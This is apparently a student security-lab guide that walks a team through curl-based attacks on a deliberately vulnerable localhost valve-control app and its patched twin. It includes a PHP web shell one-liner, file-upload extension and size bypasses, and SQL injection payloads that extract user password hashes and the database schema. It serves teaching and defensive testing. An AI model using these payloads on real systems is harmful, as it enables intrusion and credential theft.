# Step 4: Manual Testing and Verification

**Time Required:** 2 hours  
**Who:** All 3 team members (good for everyone to try)  
**Goal:** Manual verification of vulnerabilities using curl and browser, plus monitoring dashboard documentation

## Overview

Manual testing serves to:
1. Verify vulnerabilities without specialized tools
2. Show exploitation is simple (not just tool-dependent)
3. Test monitoring dashboard captures everything
4. Create additional documentation material
5. Understand the vulnerabilities at HTTP level

## Part A: Manual File Upload Tests with curl

### 1. Test Scenario 1 (No Protection) - PHP Upload

**Get session cookie:**
```bash
# Login and get session
ADMIN_SESSION="your_session_here"
```

**Create test file:**
```bash
echo '<?php echo "Vulnerable!"; system($_GET["cmd"]); ?>' > testing_results/test_files/shell.php
```

**Upload using curl:**
```bash
curl -v -X POST "http://localhost:5002/upload/scenario1" \
  -H "Cookie: session=$ADMIN_SESSION" \
  -F "file=@testing_results/test_files/shell.php" \
  -o testing_results/tool_outputs/scenario1_curl_response.html
```

**Check output:**
```bash
cat testing_results/tool_outputs/scenario1_curl_response.html
```

Should show success message with filename.

**Verify file exists:**
```bash
ls -la vulnerable/uploads/firmware/ | grep shell.php
```

**SCREENSHOT 1:** Terminal showing curl upload  
**Filename:** `38_manual_scenario1_curl.png`

### 2. Test Scenario 2 (Weak Protection) - Extension Bypass

**Try uploading .jsp (not in blacklist):**

```bash
echo '<% out.println("JSP shell"); %>' > testing_results/test_files/shell.jsp

curl -v -X POST "http://localhost:5002/upload/scenario2" \
  -H "Cookie: session=$ADMIN_SESSION" \
  -F "file=@testing_results/test_files/shell.jsp" \
  -o testing_results/tool_outputs/scenario2_jsp_response.html

cat testing_results/tool_outputs/scenario2_jsp_response.html
```

**SCREENSHOT 2:** JSP upload success  
**Filename:** `39_manual_scenario2_jsp.png`

**Try size bypass:**

```bash
dd if=/dev/zero of=testing_results/test_files/large.bin bs=1m count=10

curl -v -X POST "http://localhost:5002/upload/scenario2" \
  -H "Cookie: session=$ADMIN_SESSION" \
  -H "Content-Length: 1024" \
  -F "file=@testing_results/test_files/large.bin" \
  2>&1 | tee testing_results/tool_outputs/scenario2_size_bypass.txt
```

**SCREENSHOT 3:** Size bypass attempt  
**Filename:** `40_manual_scenario2_size.png`

### 3. Test Scenario 3 (Encrypted Bypass) - Full Flow

**Upload file:**
```bash
echo 'malicious payload' > testing_results/test_files/payload.bin

curl -v -X POST "http://localhost:5002/upload/scenario3" \
  -H "Cookie: session=$ADMIN_SESSION" \
  -F "file=@testing_results/test_files/payload.bin" \
  -o testing_results/tool_outputs/scenario3_upload_response.html

cat testing_results/tool_outputs/scenario3_upload_response.html
```

Note the file ID from response (e.g., "File uploaded with ID: 5")

**Trigger decryption:**
```bash
FILE_ID=5  # replace with actual ID

curl -v -X POST "http://localhost:5002/upload/scenario3/decrypt/$FILE_ID" \
  -H "Cookie: session=$ADMIN_SESSION" \
  -o testing_results/tool_outputs/scenario3_decrypt_response.html

cat testing_results/tool_outputs/scenario3_decrypt_response.html
```

**Check decrypted file:**
```bash
ls -la vulnerable/uploads/firmware/ | grep decrypted
cat vulnerable/uploads/firmware/decrypted_payload.bin
```

**SCREENSHOT 4:** Encrypted bypass full flow  
**Filename:** `41_manual_scenario3_flow.png`

### 4. Test All Three on Patched Version

**Quick test - all should fail:**

```bash
# Scenario 1 - should reject .php
curl -X POST "http://localhost:5001/upload/scenario1" \
  -H "Cookie: session=$ADMIN_SESSION" \
  -F "file=@testing_results/test_files/shell.php" \
  2>&1 | grep -i "error\|invalid\|rejected"

# Scenario 2 - should reject .jsp
curl -X POST "http://localhost:5001/upload/scenario2" \
  -H "Cookie: session=$ADMIN_SESSION" \
  -F "file=@testing_results/test_files/shell.jsp" \
  2>&1 | grep -i "error\|invalid\|rejected"

# Scenario 3 - should reject after decryption
curl -X POST "http://localhost:5001/upload/scenario3" \
  -H "Cookie: session=$ADMIN_SESSION" \
  -F "file=@testing_results/test_files/payload.bin" \
  2>&1 | grep -i "uploaded"
```

**SCREENSHOT 5:** Patched blocking uploads  
**Filename:** `42_manual_patched_blocks.png`

## Part B: Manual SQL Injection Tests

### 1. Basic Injection as Admin

**Simple OR bypass:**
```bash
curl -v -X POST "http://localhost:5002/valves/search" \
  -H "Cookie: session=$ADMIN_SESSION" \
  -d "search=' OR 1=1--" \
  -o testing_results/tool_outputs/sqli_or_bypass.html

cat testing_results/tool_outputs/sqli_or_bypass.html | grep -c "<tr>"
```

Should show many valve records (all valves).

**SCREENSHOT 6:** OR bypass results  
**Filename:** `43_manual_sqli_or.png`

### 2. UNION Injection - Extract Users

**Payload:**
```bash
curl -v -X POST "http://localhost:5002/valves/search" \
  -H "Cookie: session=$ADMIN_SESSION" \
  -d "search=' UNION SELECT id,username,password_hash,role,email,created_at,last_login,NULL FROM users--" \
  -o testing_results/tool_outputs/sqli_union_users.html

grep -i "admin\|operator" testing_results/tool_outputs/sqli_union_users.html
```

**SCREENSHOT 7:** UNION query extracting users  
**Filename:** `44_manual_sqli_union.png`

### 3. Extract Database Schema

**Payload:**
```bash
curl -v -X POST "http://localhost:5002/valves/search" \
  -H "Cookie: session=$ADMIN_SESSION" \
  -d "search=' UNION SELECT 1,name,sql,type,NULL,NULL,NULL,NULL FROM sqlite_master WHERE type='table'--" \
  -o testing_results/tool_outputs/sqli_schema.html

cat testing_results/tool_outputs/sqli_schema.html
```

**SCREENSHOT 8:** Schema extraction  
**Filename:** `45_manual_sqli_schema.png`

### 4. Test as Operator (Should Be Safe)

**Get operator session:**
```bash
OPERATOR_SESSION="your_operator_session_here"

curl -v -X POST "http://localhost:5002/valves/search" \
  -H "Cookie: session=$OPERATOR_SESSION" \
  -d "search=' UNION SELECT id,username,password_hash,role,email,created_at,last_login,NULL FROM users--" \
  -o testing_results/tool_outputs/sqli_operator_safe.html

cat testing_results/tool_outputs/sqli_operator_safe.html
```

Should NOT show user data (parameterized query blocks it).

**SCREENSHOT 9:** Operator safe from injection  
**Filename:** `46_manual_sqli_operator.png`

### 5. Test Patched Version

```bash
PATCHED_ADMIN_SESSION="your_patched_admin_session"

curl -v -X POST "http://localhost:5001/valves/search" \
  -H "Cookie: session=$PATCHED_ADMIN_SESSION" \
  -d "search=' UNION SELECT id,username,password_hash,role,email,created_at,last_login,NULL FROM users--" \
  -o testing_results/tool_outputs/sqli_patched_blocked.html

cat testing_results/tool_outputs/sqli_patched_blocked.html
```

Should NOT show user data (patched uses parameterized for all).

**SCREENSHOT 10:** Patched blocking injection  
**Filename:** `47_manual_sqli_patched.png`

## Part C: Monitoring Dashboard Documentation

This is crucial for the report - showing your monitoring system works.

### 1. Capture Vulnerable Version Monitoring

**After all attacks above, check monitoring:**

1. Open browser: http://localhost:5002/monitoring
2. Login as admin if needed

**Take screenshots of:**

**A. Main Dashboard:**
- Total attack count
- Attacks by type (pie chart or list)
- Recent attacks table

**SCREENSHOT 11:** Monitoring main dashboard  
**Filename:** `48_monitoring_dashboard_vulnerable.png`

**B. Filter by Attack Type - File Upload:**
- If monitoring has filters, select "file_upload_abuse"
- Show all file upload attempts

**SCREENSHOT 12:** File upload attacks  
**Filename:** `49_monitoring_file_uploads.png`

**C. Filter by Attack Type - SQL Injection:**
- Select "sql_injection"
- Show all SQL injection attempts

**SCREENSHOT 13:** SQL injection attacks  
**Filename:** `50_monitoring_sql_injections.png`

**D. Individual Attack Details:**
- Click on one attack entry
- Show detailed view with:
  - Full request parameters
  - User info
  - IP address
  - Timestamp
  - Classification
  - Severity

**SCREENSHOT 14:** Attack detail view  
**Filename:** `51_monitoring_attack_detail.png`

### 2. Capture Patched Version Monitoring

**Switch to patched:**
1. Open: http://localhost:5001/monitoring
2. Login as admin

**Take screenshots of:**

**A. Main Dashboard:**
- Should show blocked attempts
- All attacks marked as "blocked" not "allowed"

**SCREENSHOT 15:** Patched monitoring dashboard  
**Filename:** `52_monitoring_dashboard_patched.png`

**B. Compare Vulnerable vs Patched:**
- Open both in split screen
- Show same attack on both
- Vulnerable: "allowed"
- Patched: "blocked"

**SCREENSHOT 16:** Side-by-side comparison  
**Filename:** `53_monitoring_comparison.png`

### 3. Export Monitoring Data

**If monitoring has export feature, use it:**
```bash
curl "http://localhost:5002/monitoring/export" \
  -H "Cookie: session=$ADMIN_SESSION" \
  > testing_results/monitoring_logs/vulnerable_attacks.json
```

**Or manually:**
```bash
# Copy database
cp vulnerable/database/valves.db testing_results/monitoring_logs/vulnerable_valves.db

# Query attack logs
sqlite3 testing_results/monitoring_logs/vulnerable_valves.db "SELECT * FROM attack_logs;" > testing_results/monitoring_logs/attack_logs.txt

# Count attacks by type
sqlite3 testing_results/monitoring_logs/vulnerable_valves.db "SELECT attack_type, COUNT(*) FROM attack_logs GROUP BY attack_type;"
```

**Save output:**
**File:** `testing_results/monitoring_logs/attack_statistics.txt`

## Part D: Feature Testing

Verify normal application features work correctly.

### 1. Valve Control

**Test valve command:**
```bash
curl -v -X POST "http://localhost:5002/command/1" \
  -H "Cookie: session=$ADMIN_SESSION" \
  -d "action=open&percentage=75" \
  -o testing_results/tool_outputs/valve_control.html
```

**SCREENSHOT 17:** Valve control working  
**Filename:** `54_valve_control.png`

### 2. Schedule Operations

**Create schedule:**
```bash
curl -v -X POST "http://localhost:5002/schedules/add" \
  -H "Cookie: session=$ADMIN_SESSION" \
  -d "valve_id=1&action=close&scheduled_time=2024-12-31 23:59:00" \
  -o testing_results/tool_outputs/schedule_add.html
```

**SCREENSHOT 18:** Schedule creation  
**Filename:** `55_schedule_create.png`

### 3. Logs Viewing

**Check logs page:**
1. Browser: http://localhost:5002/logs
2. Verify command logs appear
3. Verify valve events logged

**SCREENSHOT 19:** Logs page  
**Filename:** `56_logs_page.png`

## Part E: Create Manual Testing Summary

**File:** `testing_results/MANUAL_TESTING_SUMMARY.md`

**Content:**
```markdown
# Manual Testing Summary - CS437 Task 5

## Test Date
[Insert Date]

## Overview
Manual verification of all vulnerabilities using curl and browser testing.

## File Upload Testing

### Scenario 1: No Protection
**Test:** Uploaded shell.php via curl
**Result:** SUCCESS - File accepted
**Evidence:** 
- File created: vulnerable/uploads/firmware/shell.php
- No validation performed
- Monitoring logged attempt

### Scenario 2: Weak Protection
**Tests:**
1. Extension bypass (.jsp upload)
   - Result: SUCCESS - JSP not in blacklist
2. Size bypass (10MB file with fake Content-Length)
   - Result: SUCCESS - Header-based check bypassed
**Evidence:**
- Both files accepted
- Monitoring logged bypasses

### Scenario 3: Encrypted Bypass
**Test:** Upload → Encrypt → Decrypt flow
**Result:** SUCCESS - Malicious payload bypassed scan
**Evidence:**
- Encrypted file accepted
- Decrypted without re-scan
- Payload extracted to firmware folder

### Patched Version
**Tests:** All three scenarios
**Result:** ALL BLOCKED ✅
**Evidence:**
- shell.php rejected (not in whitelist)
- shell.jsp rejected (not in whitelist)
- Size properly validated
- Decrypt-then-scan implemented

## SQL Injection Testing

### Basic OR Bypass (Admin)
**Payload:** `' OR 1=1--`
**Result:** SUCCESS - All valves returned
**Evidence:** HTML shows all 150 valves

### UNION Injection (Admin)
**Payload:** `' UNION SELECT ... FROM users--`
**Result:** SUCCESS - User data extracted
**Evidence:**
- Usernames: admin, operator1, operator2, viewer1
- Password hashes extracted
- Email addresses exposed

### Schema Extraction (Admin)
**Payload:** `' UNION SELECT ... FROM sqlite_master--`
**Result:** SUCCESS - Database structure revealed
**Evidence:** All table names and schemas extracted

### Operator Test
**Payload:** Same UNION injection
**Result:** SAFE - Injection blocked
**Evidence:** Parameterized query prevented exploitation

### Patched Version (Admin)
**Payload:** Same UNION injection
**Result:** SAFE - Injection blocked ✅
**Evidence:** Parameterized query for all roles

## Monitoring System Verification

### Vulnerable Version
- All attacks logged ✅
- Correct attack type classification ✅
- User and IP captured ✅
- Timestamp accurate ✅
- Payload stored ✅
- Attacks marked as "allowed" ✅

### Patched Version
- All attacks logged ✅
- Correct classification ✅
- Attacks marked as "blocked" ✅
- Prevention verified ✅

## Feature Verification

### Normal Operations
- Valve control: WORKING ✅
- Schedule creation: WORKING ✅
- Log viewing: WORKING ✅
- User authentication: WORKING ✅
- Role-based access: WORKING ✅

## Tool Outputs Generated
1. scenario1_curl_response.html
2. scenario2_jsp_response.html
3. scenario2_size_bypass.txt
4. scenario3_upload_response.html
5. scenario3_decrypt_response.html
6. sqli_or_bypass.html
7. sqli_union_users.html
8. sqli_schema.html
9. sqli_operator_safe.html
10. sqli_patched_blocked.html
11. vulnerable_attacks.json
12. attack_logs.txt
13. attack_statistics.txt

## Screenshots Captured
38-56 (19 screenshots covering all manual tests)

## Conclusions

1. **All vulnerabilities confirmed** through manual testing
2. **Monitoring system effective** - captured all attacks
3. **Patched version secure** - blocked all attempts
4. **Normal features preserved** - patches don't break functionality
5. **Exploitation is simple** - no complex tools required
```

## Troubleshooting

**"curl: command not found":**
```bash
brew install curl
```

**"Session expired":**
- Get fresh session cookie
- Login again in browser

**"File not found after upload":**
- Check correct uploads folder
- Verify Docker volumes mounted correctly

**"Monitoring page empty":**
- Verify attacks were performed
- Check database exists: `ls -la vulnerable/database/valves.db`
- Query directly:
```bash
sqlite3 vulnerable/database/valves.db "SELECT COUNT(*) FROM attack_logs;"
```

**"HTML output unreadable":**
- Open in browser:
```bash
open testing_results/tool_outputs/sqli_union_users.html
```

## Summary Checklist

After manual testing, verify:

- [ ] All 3 upload scenarios tested with curl
- [ ] All 3 scenarios tested on patched (blocked)
- [ ] SQL injection tested as admin (works)
- [ ] SQL injection tested as operator (safe)
- [ ] SQL injection tested on patched (blocked)
- [ ] Monitoring dashboard captured (vulnerable)
- [ ] Monitoring dashboard captured (patched)
- [ ] Attack details captured
- [ ] Side-by-side comparison screenshot
- [ ] 19 screenshots taken (38-56)
- [ ] 13 tool output files saved
- [ ] MANUAL_TESTING_SUMMARY.md created
- [ ] Normal features tested and working

## Next Steps

**Once manual testing complete:**
→ **05_ORGANIZING_RESULTS.md**

**Estimated time for next step:** 1-2 hours
